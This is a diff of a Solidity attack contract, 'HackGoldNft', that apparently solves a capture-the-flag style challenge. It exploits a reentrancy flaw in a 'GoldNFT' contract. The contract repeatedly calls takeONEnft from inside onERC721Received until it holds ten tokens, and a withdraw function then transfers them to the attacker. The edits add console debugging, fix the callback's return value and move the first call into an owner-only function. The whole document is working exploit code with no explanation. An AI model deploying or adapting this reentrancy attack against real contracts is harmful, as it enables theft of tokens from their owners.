@@ -2,7 +2,8 @@
 pragma solidity ^0.8.0;
 
 import "./GoldNFT.sol";
-
+import "forge-std/console.sol";
+import "forge-std/console2.sol";
 interface IERC721Receiver {
     /**
      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
@@ -29,9 +30,9 @@ contract HackGoldNft {
     address public owner;
 
     constructor(address _goldNFT){
+        console.log("constructor checkpoint");
         owner = msg.sender;
         nft = GoldNFT(_goldNFT);
-        nft.takeONEnft(PASS);
     }
 
     modifier isOwner() {
@@ -40,19 +41,34 @@ contract HackGoldNft {
         _;
     }
 
+    function initializeReent()external isOwner{
+        console.log("init checkpoint");
+        nft.takeONEnft(PASS);
+    }
     function onERC721Received(
         address operator,
         address from,
         uint256 tokenId,
         bytes calldata data
     ) external returns (bytes4){
-        nft.transferFrom(address(this), owner, tokenId);
-        uint256 balance = nft.balanceOf(owner);
+        console.log("onERCRECEIVED checkpoint");
+        console.log(tokenId);
+        uint256 balance = nft.balanceOf(address(this));
         if (balance < 11){
-            nft.takeONEnft(PASS)
+            nft.takeONEnft(PASS);
         }
+        return IERC721Receiver.onERC721Received.selector;
     }
 
+
+
+    function withdrawNFTs() external isOwner{
+        console.log('withdrawNFTs checkmark');
+        for(uint i=1;i<11;i++){
+            console.log(i);
+            nft.transferFrom(address(this), msg.sender, i);      
+        }
+    }
 
 
 }
